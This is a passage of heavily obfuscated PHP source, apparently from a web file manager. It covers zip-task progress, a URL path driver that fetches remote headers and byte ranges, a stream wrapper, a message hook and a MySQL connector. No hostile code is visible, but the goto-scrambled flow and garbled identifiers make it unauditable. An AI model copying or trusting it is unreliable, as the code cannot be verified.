goto aò¯¤Ã­§î; CæÚ²Ÿ¿è: $eÆ¦‹ò‘Ÿ =& $_SERVER[ä°„ä°º]; $A“„°„œ» =& $this->task; $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1641]] = $eÆ¦‹ò‘Ÿ[107]; goto aê‘ê‡…ÔÛ; E¡¶äàÊŒæ: $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1595]] = $eÆ¦‹ò‘Ÿ[33]; $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1602]] = 0; $A“„°„œ»[$eÆ¦‹ò‘Ÿ[746]] = $EËèŸïÁ­­[$eÆ¦‹ò‘Ÿ[78]]; goto DŸµÂÖ™¼ò; aê‘ê‡…ÔÛ: $EËèŸïÁ­­ = IO::infoWithChildren($c«äóÊ»áô); $EÒË®ÍÏ = 0; $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1606]] = array($eÆ¦‹ò‘Ÿ[1607] => $EÒË®ÍÏ + 1, $eÆ¦‹ò‘Ÿ[413] => $EËèŸïÁ­­[$eÆ¦‹ò‘Ÿ[28]], $eÆ¦‹ò‘Ÿ[76] => $EËèŸïÁ­­[$eÆ¦‹ò‘Ÿ[76]], $eÆ¦‹ò‘Ÿ[500] => $EËèŸïÁ­­[$eÆ¦‹ò‘Ÿ[500]] ? $EËèŸïÁ­­[$eÆ¦‹ò‘Ÿ[500]] : $EËèŸïÁ­­[$eÆ¦‹ò‘Ÿ[76]]); goto bº…‘ø¿¨™; aò¯¤Ã­§î: $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1057]] = 0; $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1597]] = 0; $A“„°„œ»[$eÆ¦‹ò‘Ÿ[1598]] = 0; goto E¡¶äàÊŒæ; aÈ‹Ëá³ßÕ: } public function nameParse($Bæ¼ÅÌñèÅ) { goto a®½ÏÊÆ¾Á; fäçƒÑ‘ƒË: $Bİ©˜Ö¾Ä = get_path_this($Bæ¼ÅÌñèÅ); if (strstr($Bİ©˜Ö¾Ä, $f Ò÷»¹çİ[95])) { $aïíÑç¤¸[$f Ò÷»¹çİ[1057]] += 1; $aïíÑç¤¸[$f Ò÷»¹çİ[1042]] += 1; } $aïíÑç¤¸[$f Ò÷»¹çİ[1595]] = $Bæ¼ÅÌñèÅ; goto cÕîš«Ñç; a®½ÏÊÆ¾Á: $f Ò÷»¹çİ =& $_SERVER[ä°„ä°º]; $aïíÑç¤¸ =& $this->task; if ($aïíÑç¤¸[$f Ò÷»¹çİ[1641]] == $f Ò÷»¹çİ[1115]) { $aïíÑç¤¸[$f Ò÷»¹çİ[1641]] = $f Ò÷»¹çİ[311]; $aïíÑç¤¸[$f Ò÷»¹çİ[1602]] = 0; $aïíÑç¤¸[$f Ò÷»¹çİ[746]] = 0; } goto fäçƒÑ‘ƒË; cÕîš«Ñç: $this->update(); goto BŸÛÆ±¼´é; BŸÛÆ±¼´é: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $F´¸ô‰ì© =& $_SERVER[ä°„ä°º]; parent::startAfter(); Hook::bind($F´¸ô‰ì©[1644], array($this, $F´¸ô‰ì©[1639])); $d‹Ã¦å“æ =& $this->task; $d‹Ã¦å“æ[$F´¸ô‰ì©[1641]] = $F´¸ô‰ì©[1115]; if (!$d‹Ã¦å“æ[$F´¸ô‰ì©[1454]]) { $d‹Ã¦å“æ[$F´¸ô‰ì©[1454]] = LNG($F´¸ô‰ì©[1645]); } } protected function endAfter() { $Dò‡»¾‹ÉÍ =& $_SERVER[ä°„ä°º]; parent::endAfter(); Hook::unbind($Dò‡»¾‹ÉÍ[1644], array($this, $Dò‡»¾‹ÉÍ[1639])); } public function updateAfter() { $A¤ŞßÒ‘¿Â =& $_SERVER[ä°„ä°º]; $EÉ‚‡ˆÃëï =& $this->task; if (!$EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1042]] || !$EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[746]]) { return; } if ($EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1641]] == $A¤ŞßÒ‘¿Â[1115]) { $b¿½ÈÃ¿½ = $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1598]]; if ($EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1599]] != $A¤ŞßÒ‘¿Â[1115]) { $b¿½ÈÃ¿½ = 0; } $F“Òø½‹ = ($EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1602]] + $b¿½ÈÃ¿½) / $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[746]]; $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1552]] = $F“Òø½‹ * 0.3; } else { if ($EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1641]] == $A¤ŞßÒ‘¿Â[311]) { $F“Òø½‹ = $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1057]] / $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1042]]; $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1552]] = 0.3 + $F“Òø½‹ * 0.5; } else { if ($EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1641]] == $A¤ŞßÒ‘¿Â[107]) { $F“Òø½‹ = 0; if ($EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1597]]) { $F“Òø½‹ = $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1598]] / $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1597]]; } $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1552]] = 0.3 + 0.5 + $F“Òø½‹ * 0.2; } } } if ($EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1552]] > 0) { $fèÌ›Ïå„Û = timeFloat() - $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[772]] - $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1555]]; $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1556]] = $fèÌ›Ïå„Û * (1 - $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1552]]) / $EÉ‚‡ˆÃëï[$A¤ŞßÒ‘¿Â[1552]]; } } public function copyFileStart($cì«¦Ã´, $d…‹’æ©¥•, $d…á°²÷¹, $CïøƒØœ, $E¾ß„ßÖ…Ô, $CÔ¨§š´°â) { $F¹¢…ØØ® =& $_SERVER[ä°„ä°º]; parent::copyFileStart($cì«¦Ã´, $d…‹’æ©¥•, $d…á°²÷¹, $CïøƒØœ, $E¾ß„ßÖ…Ô, $CÔ¨§š´°â); $Aèç†ğ¯Œî =& $this->task; if ($Aèç†ğ¯Œî[$F¹¢…ØØ®[1641]] == $F¹¢…ØØ®[311]) { $Aèç†ğ¯Œî[$F¹¢…ØØ®[1641]] = $F¹¢…ØØ®[107]; } $this->update(); } public function copyFileEnd($bßŞŒËËË, $e•¤Í«åî¨, $EÄÅ©éÆó, $D”‡Çè’Ò, $Cêà¹î‚÷¡, $bàšË¤­–Â) { $eœ¿±í” =& $_SERVER[ä°„ä°º]; $a¤ŸŠÉ¹­ =& $this->task; $a¤ŸŠÉ¹­[$eœ¿±í”[1598]] = $a¤ŸŠÉ¹­[$eœ¿±í”[1597]]; $a¤ŸŠÉ¹­[$eœ¿±í”[1602]] += $a¤ŸŠÉ¹­[$eœ¿±í”[1597]]; $a¤ŸŠÉ¹­[$eœ¿±í”[1599]] = $eœ¿±í”[33]; $this->update(); } public function nameParse($F½Á´ƒ·Öå) { $aêÖŸäµ¹  =& $_SERVER[ä°„ä°º]; $bëĞ·ãæŒ’ =& $this->task; if ($bëĞ·ãæŒ’[$aêÖŸäµ¹ [1057]] < $bëĞ·ãæŒ’[$aêÖŸäµ¹ [1042]]) { $C­´ñ¸éèå = get_path_this($F½Á´ƒ·Öå); if (strstr($C­´ñ¸éèå, $aêÖŸäµ¹ [95])) { $bëĞ·ãæŒ’[$aêÖŸäµ¹ [1057]] += 1; } } if ($bëĞ·ãæŒ’[$aêÖŸäµ¹ [1641]] == $aêÖŸäµ¹ [1115]) { $bëĞ·ãæŒ’[$aêÖŸäµ¹ [1641]] = $aêÖŸäµ¹ [311]; } $bëĞ·ãæŒ’[$aêÖŸäµ¹ [1595]] = $F½Á´ƒ·Öå; $this->update(); } } goto d°†øßï»˜; a½öõ†çé‚: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($D£ñ£Œ§™É = false) { } public function exist($eÊ÷¢½”î¬) { $FÁ„°œÃ—Ì = $this->info($eÊ÷¢½”î¬); return $FÁ„°œÃ—Ì[$_SERVER[ä°„ä°º][195]]; } public function isFile($d‹¬óøõĞ²) { $F§»áÜ‡Çä = $this->info($d‹¬óøõĞ²); return $F§»áÜ‡Çä[$_SERVER[ä°„ä°º][195]]; } public function isFolder($bÑÔİÅ†›) { return !1; } public function size($C”øÓ›ÎíÉ) { $F„ˆ°¿ø† = $this->info($C”øÓ›ÎíÉ); return $F„ˆ°¿ø†[$_SERVER[ä°„ä°º][78]]; } public function info($e©ÀÛ£¹áÆ) { return $this->infoParse($e©ÀÛ£¹áÆ); } public function infoAuth($Fî’ôì–¬ß) { return $this->infoParse($Fî’ôì–¬ß); } public function infoWithChildren($C­ïö‘ŒÂõ) { return $this->infoParse($C­ïö‘ŒÂõ); } public function infoFull($f½ÒÅÊ³Ê) { return $this->infoParse($f½ÒÅÊ³Ê); } private function infoParse($FÆ‚±— ”‚) { $F Å®¶¼ºä =& $_SERVER[ä°„ä°º]; $EÃ†Ê‘ˆ = $this->header($FÆ‚±— ”‚); if (!$EÃ†Ê‘ˆ || !$EÃ†Ê‘ˆ[$F Å®¶¼ºä[733]]) { return !1; } $d£«¦çªÂï = _get($EÃ†Ê‘ˆ, $F Å®¶¼ºä[335], 0); $Dè“ö’ùìŸ = array($F Å®¶¼ºä[28] => $EÃ†Ê‘ˆ[$F Å®¶¼ºä[28]], $F Å®¶¼ºä[76] => $FÆ‚±— ”‚, $F Å®¶¼ºä[29] => $F Å®¶¼ºä[193], $F Å®¶¼ºä[78] => intval($d£«¦çªÂï), $F Å®¶¼ºä[168] => get_path_ext($EÃ†Ê‘ˆ[$F Å®¶¼ºä[28]]), $F Å®¶¼ºä[1277] => $d£«¦çªÂï > 0 && $EÃ†Ê‘ˆ[$F Å®¶¼ºä[1397]], $F Å®¶¼ºä[1278] => !1); return $Dè“ö’ùìŸ; } private function header($cøßÍù¥ˆ) { goto A™ÙŒ¥ºµ; A•ƒ‰çÁ“¦: $GLOBALS[$CÓÈ«à’İ‡[1398]] = !0; self::$_cacheHeader[$cøßÍù¥ˆ] = url_header($cøßÍù¥ˆ); $GLOBALS[$CÓÈ«à’İ‡[1398]] = $A¸ùñ¬´¶‰; goto E«ÁµôÛêï; A™ÙŒ¥ºµ: $CÓÈ«à’İ‡ =& $_SERVER[ä°„ä°º]; if (isset(self::$_cacheHeader[$cøßÍù¥ˆ])) { return self::$_cacheHeader[$cøßÍù¥ˆ]; } $A¸ùñ¬´¶‰ = isset($GLOBALS[$CÓÈ«à’İ‡[1398]]) ? $GLOBALS[$CÓÈ«à’İ‡[1398]] : !1; goto A•ƒ‰çÁ“¦; E«ÁµôÛêï: return self::$_cacheHeader[$cøßÍù¥ˆ]; goto AÚ¼õÅÈØ; AÚ¼õÅÈØ: } public function hashSimple($bÍœ»Ñ’, $eÚÅ¯œ™É = false) { goto F¯İ¦™…ÑÆ; A„×Õ»èÔ: $bø˜œ›Ë»¦ .= $this->fileSubstr($bÍœ»Ñ’, $Aè“‡õ¹ µ - $aæª¡ç®¿, $aæª¡ç®¿); return md5($bø˜œ›Ë»¦) . $Aè“‡õ¹ µ; goto fèÖìÄ­; F¯İ¦™…ÑÆ: $dÆ×Îê¯êÑ =& $_SERVER[ä°„ä°º]; $e§®Ë÷‰È÷ = $this->info($bÍœ»Ñ’); if (!$e§®Ë÷‰È÷ || !$e§®Ë÷‰È÷[$dÆ×Îê¯êÑ[195]]) { return !1; } goto eµò­¥ôÙØ; e¦ßÕÎ¢Ê“: if ($Aè“‡õ¹ µ <= $aæª¡ç®¿ * $AÒ‹½º¤ò¼) { return md5($this->fileSubstr($bÍœ»Ñ’, 0, $Aè“‡õ¹ µ)) . $Aè“‡õ¹ µ; } $c£é„é¶â“ = intval($Aè“‡õ¹ µ / $AÒ‹½º¤ò¼); $bø˜œ›Ë»¦ = $dÆ×Îê¯êÑ[33]; goto Fœ¤í—¥¾£; eµò­¥ôÙØ: $Aè“‡õ¹ µ = $e§®Ë÷‰È÷[$dÆ×Îê¯êÑ[78]]; $aæª¡ç®¿ = 200; $AÒ‹½º¤ò¼ = 50; goto e¦ßÕÎ¢Ê“; Fœ¤í—¥¾£: $Fğõëˆ”ø = timeFloat(); $CğËè®òœ = 15; for ($e…ˆ‚ÛÒ¨½ = 0; $e…ˆ‚ÛÒ¨½ < $AÒ‹½º¤ò¼; $e…ˆ‚ÛÒ¨½++) { if (timeFloat() - $Fğõëˆ”ø > $CğËè®òœ) { return !1; } $câ¯´ÅÀ„µ = $this->fileSubstr($bÍœ»Ñ’, $c£é„é¶â“ * $e…ˆ‚ÛÒ¨½, $aæª¡ç®¿); if (!$câ¯´ÅÀ„µ) { return !1; } $bø˜œ›Ë»¦ .= $câ¯´ÅÀ„µ; } goto A„×Õ»èÔ; fèÖìÄ­: } public function getContent($eÙ”Ê¥¦Œ§) { return $this->fileSubstr($eÙ”Ê¥¦Œ§); } public function fileSubstr($E˜±“Ã²·, $DãõÒ ½Ü = 0, $A«¿Îá¬¢Æ = -1) { goto d±µÀ˜¼ğ¢; dé…Ù¤©Íƒ: $Fì®–ŞÄ‚½ = url_request($E˜±“Ã²·, $eåçÃ¼ã©Â[228], !1, $dÖÎÖòÔ¥…, !1, !1, 1); return $Fì®–ŞÄ‚½[$eåçÃ¼ã©Â[1109]] ? $Fì®–ŞÄ‚½[$eåçÃ¼ã©Â[1109]] : $eåçÃ¼ã©Â[33]; goto A”†±à’Ù; d±µÀ˜¼ğ¢: $eåçÃ¼ã©Â =& $_SERVER[ä°„ä°º]; $C‹ÔÛ·¾°Å = $this->info($E˜±“Ã²·); if (!$C‹ÔÛ·¾°Å || !$C‹ÔÛ·¾°Å[$eåçÃ¼ã©Â[195]] && $C‹ÔÛ·¾°Å[$eåçÃ¼ã©Â[78]] > 1024 * 1024 * 10) { return !1; } goto E¼Î¤’‚Š‡; E¼Î¤’‚Š‡: if ($A«¿Îá¬¢Æ === -1) { $A«¿Îá¬¢Æ = $C‹ÔÛ·¾°Å[$eåçÃ¼ã©Â[78]]; } if ($A«¿Îá¬¢Æ == 0) { return $eåçÃ¼ã©Â[33]; } $dÖÎÖòÔ¥… = array($eåçÃ¼ã©Â[1399] . $DãõÒ ½Ü . $eåçÃ¼ã©Â[767] . ($DãõÒ ½Ü + $A«¿Îá¬¢Æ - 1)); goto dé…Ù¤©Íƒ; A”†±à’Ù: } public function download($d‘ÚÕŞ“Ëò, $E³…¯Î°à·) { Downloader::start($d‘ÚÕŞ“Ëò, $E³…¯Î°à·); return $E³…¯Î°à·; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($e‹£ã’¿²Ú, $fğ…Ç—“Ó = '') { goto c¨ç‰”è¢í; d†÷ÓìµÍÅ: if (!isset(self::$_chunkBuffer[$e‹£ã’¿²Ú])) { self::$_chunkBuffer[$e‹£ã’¿²Ú] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto c•°„¸¸Ñø; a›¶¬ôŞëŒ: $this->pathOpen = $e‹£ã’¿²Ú; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto d†÷ÓìµÍÅ; c¨ç‰”è¢í: $this->info = $this->info($e‹£ã’¿²Ú); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ä°„ä°º][76]]; goto a›¶¬ôŞëŒ; c•°„¸¸Ñø: } function stream_read($eÀÌ££‡ÍÕ) { $f´¥·œˆ©ò = $this->fileSubstr($this->pose, $eÀÌ££‡ÍÕ); $this->pose += strlen($f´¥·œˆ©ò); return $f´¥·œˆ©ò; } public function stream_tell() { return $this->pose; } public function stream_seek($fÁ»ôè‘÷, $Eœã•‘„Ñ¥) { $DÚ³Ø¨ÕÅ‚ =& $_SERVER[ä°„ä°º]; if ($Eœã•‘„Ñ¥ == SEEK_SET) { $this->pose = $fÁ»ôè‘÷; } else { if ($Eœã•‘„Ñ¥ == SEEK_CUR) { $this->pose += $fÁ»ôè‘÷; } else { if ($Eœã•‘„Ñ¥ == SEEK_END) { $this->pose = $this->info[$DÚ³Ø¨ÕÅ‚[78]] + intval($fÁ»ôè‘÷); } } } if ($fÁ»ôè‘÷ < 0) { $this->pose = $this->info[$DÚ³Ø¨ÕÅ‚[78]] + $fÁ»ôè‘÷; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ä°„ä°º][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($CˆËŠ÷Ù½ù, $c¬ò³¼ƒëœ) { $E¹«Êò‘®£ =& $_SERVER[ä°„ä°º]; $a§Ãè‘·¶— = $this->info($CˆËŠ÷Ù½ù); return array($E¹«Êò‘®£[1400] => 0, $E¹«Êò‘®£[1401] => 0, $E¹«Êò‘®£[12] => 32768 + 511, $E¹«Êò‘®£[1402] => 0, $E¹«Êò‘®£[1403] => 0, $E¹«Êò‘®£[1404] => 0, $E¹«Êò‘®£[1405] => 0, $E¹«Êò‘®£[78] => $a§Ãè‘·¶—[$E¹«Êò‘®£[78]], $E¹«Êò‘®£[1406] => $a§Ãè‘·¶—[$E¹«Êò‘®£[1276]], $E¹«Êò‘®£[1362] => $a§Ãè‘·¶—[$E¹«Êò‘®£[84]], $E¹«Êò‘®£[1361] => $a§Ãè‘·¶—[$E¹«Êò‘®£[194]], $E¹«Êò‘®£[1407] => 0, $E¹«Êò‘®£[1408] => 0); } static $fileInfo = array(); public function info($E§‚÷¥‰·Ã) { $aóĞ´ê°šõ = $_SERVER[ä°„ä°º][1409]; if (isset(self::$fileInfo[$E§‚÷¥‰·Ã])) { return self::$fileInfo[$E§‚÷¥‰·Ã]; } if (substr($E§‚÷¥‰·Ã, 0, strlen($aóĞ´ê°šõ)) != $aóĞ´ê°šõ) { return !1; } self::$fileInfo[$E§‚÷¥‰·Ã] = IO::info(substr($E§‚÷¥‰·Ã, strlen($aóĞ´ê°šõ))); return self::$fileInfo[$E§‚÷¥‰·Ã]; } public static function read($aŸ†¯²¯é, $d”¡àÄ’ê, $b¯ï‡æã“) { if (!isset(self::$_fopenCache[$aŸ†¯²¯é])) { $fÊ‰çğ‡ô¤ = new StreamWrapperIO(); $fÊ‰çğ‡ô¤->stream_open($aŸ†¯²¯é); self::$_fopenCache[$aŸ†¯²¯é] = $fÊ‰çğ‡ô¤; } $fÊ‰çğ‡ô¤ = self::$_fopenCache[$aŸ†¯²¯é]; return $fÊ‰çğ‡ô¤->fileSubstr($d”¡àÄ’ê, $b¯ï‡æã“); } public static function _read($B»åÅ˜ã…, $fÒ é¸½õ, $a‚‚À­¾°Î) { goto dÔØÙ®ïãÓ; EÀ›ªêòâ°: $DÇ¿¼Ñ½¥ = 8192; fseek($FØ–‹¡Ë¯Â, $fÒ é¸½õ, SEEK_SET); $A“ëİÙ† = $bŠ”ñ–³[33]; goto EĞÛ© ›³; EĞÛ© ›³: $e·é–Ù­«í = 0; while ($e·é–Ù­«í < $a‚‚À­¾°Î) { $dÚš˜Ø‡³æ = min($DÇ¿¼Ñ½¥, $a‚‚À­¾°Î - $e·é–Ù­«í); $A“ëİÙ† .= fread($FØ–‹¡Ë¯Â, $dÚš˜Ø‡³æ); $e·é–Ù­«í += $dÚš˜Ø‡³æ; } fclose($FØ–‹¡Ë¯Â); goto D‘Üå¥‰àÁ; dÔØÙ®ïãÓ: $bŠ”ñ–³ =& $_SERVER[ä°„ä°º]; $FØ–‹¡Ë¯Â = fopen($B»åÅ˜ã…, $bŠ”ñ–³[1280]); if (!$FØ–‹¡Ë¯Â) { return $bŠ”ñ–³[33]; } goto EÀ›ªêòâ°; D‘Üå¥‰àÁ: return $A“ëİÙ†; goto dÏå¡×Ç¯„; dÏå¡×Ç¯„: } public function fileSubstr($DÖÊšĞŞ, $Aö—©Ù¦‚à) { goto aí…äŒÄ¹Æ; aí…äŒÄ¹Æ: $Aä…¤ñˆ‰ô =& $_SERVER[ä°„ä°º]; $eëÙ¥‰ = $this->info[$Aä…¤ñˆ‰ô[78]]; $b¢´ÖçÍÑ = $DÖÊšĞŞ; goto eÁù„Æ®˜ ; eÁù„Æ®˜ : $dÌ‡åÒõÒ‡ = $Aö—©Ù¦‚à; if ($DÖÊšĞŞ < 0) { $DÖÊšĞŞ = $eëÙ¥‰ + $DÖÊšĞŞ; } if ($Aö—©Ù¦‚à === !1) { $Aö—©Ù¦‚à = $eëÙ¥‰ - $DÖÊšĞŞ; } goto A¸æôÔÂø; C™¶À‰§ø: $F®‰ó¸ù¢å = ceil(($DÖÊšĞŞ + $Aö—©Ù¦‚à) / $dØ·‘ãŠ÷ ) * $dØ·‘ãŠ÷  - $a›°ÌŒ†­ğ; $a«ùŒĞ¤¬ = IO::fileSubstr($this->path, $a›°ÌŒ†­ğ, $F®‰ó¸ù¢å); $B¤•’™ğ¸Á[$a›°ÌŒ†­ğ . $Aä…¤ñˆ‰ô[33]] = $a«ùŒĞ¤¬; goto bÌŠ¢Â„÷; a”„Š¶±µš: foreach ($B¤•’™ğ¸Á as $AÕ…Í‹Ç => $cËƒ±ÌŸ“) { $AÕ…Í‹Ç = intval($AÕ…Í‹Ç); $e·„¡†ëİ = $AÕ…Í‹Ç + strlen($cËƒ±ÌŸ“); if ($DÖÊšĞŞ >= $e·„¡†ëİ) { continue; } if ($DÖÊšĞŞ >= $AÕ…Í‹Ç && $DÖÊšĞŞ + $Aö—©Ù¦‚à <= $e·„¡†ëİ) { return substr($cËƒ±ÌŸ“, $DÖÊšĞŞ - $AÕ…Í‹Ç, $Aö—©Ù¦‚à); } break; } if (count($B¤•’™ğ¸Á) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Aä…¤ñˆ‰ô[1410], $Aä…¤ñˆ‰ô[1411] . count($B¤•’™ğ¸Á) . "\73\163\x74\x61\162\164\75{$DÖÊšĞŞ}\x2c\x6c\x65\156\x67\164\150\x3d{$Aö—©Ù¦‚à}\x3b\x70\x6f\163\x65\x3a{$AÕ…Í‹Ç}\x7e{$e·„¡†ëİ}"); throw new Exception($Aä…¤ñˆ‰ô[1412]); } $a›°ÌŒ†­ğ = intval($DÖÊšĞŞ / $dØ·‘ãŠ÷ ) * $dØ·‘ãŠ÷ ; goto C™¶À‰§ø; a éÛ‚â·ã: $dØ·‘ãŠ÷  = 64 * 1024; $B¤•’™ğ¸Á =& self::$_chunkBuffer[$this->path]; if (!$B¤•’™ğ¸Á) { $B¤•’™ğ¸Á = array(); } goto E¡™­áƒ¼›; bÌŠ¢Â„÷: ksort($B¤•’™ğ¸Á); $CˆÀÊÈÒÛà = substr($a«ùŒĞ¤¬, $DÖÊšĞŞ - $a›°ÌŒ†­ğ, $Aö—©Ù¦‚à); return $CˆÀÊÈÒÛà; goto B¬Ùáçë¼ˆ; E¡™­áƒ¼›: $AÕ…Í‹Ç = 0; $e·„¡†ëİ = 0; $cËƒ±ÌŸ“ = $Aä…¤ñˆ‰ô[33]; goto a”„Š¶±µš; A¸æôÔÂø: if ($DÖÊšĞŞ + $Aö—©Ù¦‚à > $eëÙ¥‰) { $Aö—©Ù¦‚à = $eëÙ¥‰ - $DÖÊšĞŞ; } if ($Aö—©Ù¦‚à <= 0) { return $Aä…¤ñˆ‰ô[33]; } if ($DÖÊšĞŞ < 0 || $DÖÊšĞŞ >= $eëÙ¥‰ || $Aö—©Ù¦‚à <= 0 || $Aö—©Ù¦‚à > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\x69\x6c\x65\x52\x65\141\144\x20\145\162\x72\157\x72\41\x20\x73\x74\x61\162\164\x3d{$DÖÊšĞŞ}\73\x6c\x65\x6e\x67\164\150\75{$Aö—©Ù¦‚à}\73\40\x73\x69\x7a\145\x3d{$eëÙ¥‰}\x3b"); } goto a éÛ‚â·ã; B¬Ùáçë¼ˆ: } private function log($d’»ø¹ÌÍ, $bÎ…¡¤Ë—) { $F«´‘Ï¿ =& $_SERVER[ä°„ä°º]; $Cää©·‰ö» = timeFloat() - $this->timeStart; write_log(sprintf($F«´‘Ï¿[1413], $d’»ø¹ÌÍ, $this->info[$F«´‘Ï¿[28]], $Cää©·‰ö», $bÎ…¡¤Ë—), $F«´‘Ï¿[1099]); } } class Message { function __construct() { } public function send($AÔ¦¡Á¥í = '', $Cææ¡ĞÒ§Ö = array(), $E¥†¤ £•ñ = "\164\x65\x78\x74") { goto F¿¯Î¥ñ†è; dì¨‘ß¦ƒÚ: $Cææ¡ĞÒ§Ö = array($CÕµôƒ¬¢[496] => isset($Cææ¡ĞÒ§Ö[$CÕµôƒ¬¢[496]]) ? $Cææ¡ĞÒ§Ö[$CÕµôƒ¬¢[496]] : $CÕµôƒ¬¢[33], $CÕµôƒ¬¢[575] => isset($Cææ¡ĞÒ§Ö[$CÕµôƒ¬¢[575]]) ? $Cææ¡ĞÒ§Ö[$CÕµôƒ¬¢[575]] : $CÕµôƒ¬¢[33]); if (empty($AÔ¦¡Á¥í) || empty($Cææ¡ĞÒ§Ö[$CÕµôƒ¬¢[496]]) && empty($Cææ¡ĞÒ§Ö[$CÕµôƒ¬¢[575]])) { return !1; } $aÙåÌôùÒ = array($CÕµôƒ¬¢[1355] => $bÎ´¼‰, $CÕµôƒ¬¢[1416] => $Cææ¡ĞÒ§Ö); goto d·ÄíÀ†Ûµ; F¿¯Î¥ñ†è: $CÕµôƒ¬¢ =& $_SERVER[ä°„ä°º]; $bÎ´¼‰ = array($CÕµôƒ¬¢[29] => $CÕµôƒ¬¢[1414], $CÕµôƒ¬¢[738] => $AÔ¦¡Á¥í); if (in_array($E¥†¤ £•ñ, array($CÕµôƒ¬¢[1414], $CÕµôƒ¬¢[1415]))) { $bÎ´¼‰[$CÕµôƒ¬¢[29]] = $E¥†¤ £•ñ; } goto dì¨‘ß¦ƒÚ; d·ÄíÀ†Ûµ: Hook::trigger($CÕµôƒ¬¢[1417], $aÙåÌôùÒ); goto Dâ…¹´–¨; Dâ…¹´–¨: } } goto DÇñ¦Ò’Ô±; FãÇòÓŒ½š: class DbMysql extends Db { public function __construct($d¬µŒ†–Öö = '') { $E—‰ë¶¶ˆÒ =& $_SERVER[ä°„ä°º]; if (!extension_loaded($E—‰ë¶¶ˆÒ[782])) { think_exception(think_lang($E—‰ë¶¶ˆÒ[10]) . $E—‰ë¶¶ˆÒ[867]); } if (!empty($d¬µŒ†–Öö)) { $this->config = $d¬µŒ†–Öö; if (empty($this->config[$E—‰ë¶¶ˆÒ[13]])) { $this->config[$E—‰ë¶¶ˆÒ[13]] = $E—‰ë¶¶ˆÒ[33]; } } } public function connect($cî •ùñÍ = '', $CÚ°«¿› = 0, $E¡´èº‰Ö‰ = false) { $d™›¾›‡‘‡ =& $_SERVER[ä°„ä°º]; if (!isset($this->linkID[$CÚ°«¿›])) { goto e£ˆöø¸¶Ê; e…Õ»‡÷ëù: if ($eƒØ¹Ö„…) { $this->linkID[$CÚ°«¿›] = mysql_pconnect($a•æª‰•ò½, $cî •ùñÍ[$d™›¾›‡‘‡[870]], $cî •ùñÍ[$d™›¾›‡‘‡[871]], 131072); } else { $this->linkID[$CÚ°«¿›] = mysql_connect($a•æª‰•ò½, $cî •ùñÍ[$d™›¾›‡‘‡[870]], $cî •ùñÍ[$d™›¾›‡‘‡[871]], !0, 131072); } if (!$this->linkID[$CÚ°«¿›] || !empty($cî •ùñÍ[$d™›¾›‡‘‡[17]]) && !mysql_select_db($cî •ùñÍ[$d™›¾›‡‘‡[17]], $this->linkID[$CÚ°«¿›])) { think_exception(mysql_error()); } $a¾ÖÔ˜Ñ˜ = mysql_get_server_info($this->linkID[$CÚ°«¿›]); goto cë½Ğî‘Ï; cë½Ğî‘Ï: mysql_query($d™›¾›‡‘‡[872] . think_config($d™›¾›‡‘‡[873]) . $d™›¾›‡‘‡[55], $this->linkID[$CÚ°«¿›]); if ($a¾ÖÔ˜Ñ˜ > $d™›¾›‡‘‡[874]) { mysql_query($d™›¾›‡‘‡[875], $this->linkID[$CÚ°«¿›]); } $this->connected = !0; goto F¢—îÖ¤Ù„; F¢—îÖ¤Ù„: if (1 != think_config($d™›¾›‡‘‡[18])) { unset($this->config); } goto féÜç…ÇÎ; e£ˆöø¸¶Ê: if (empty($cî •ùñÍ)) { $cî •ùñÍ = $this->config; } $a•æª‰•ò½ = $cî •ùñÍ[$d™›¾›‡‘‡[868]] . ($cî •ùñÍ[$d™›¾›‡‘‡[869]] ? "\x3a{$cî •ùñÍ[$d™›¾›‡‘‡[869]]}" : $d™›¾›‡‘‡[33]); $eƒØ¹Ö„… = !empty($cî •ùñÍ[$d™›¾›‡‘‡[13]][$d™›¾›‡‘‡[14]]) ? $cî •ùñÍ[$d™›¾›‡‘‡[13]][$d™›¾›‡‘‡[14]] : $this->pconnect; goto e…Õ»‡÷ëù; féÜç…ÇÎ: } return $this->linkID[$CÚ°«¿›]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($b‚ãÃö¢ª) { goto BÙ”Úó†ÅÈ; 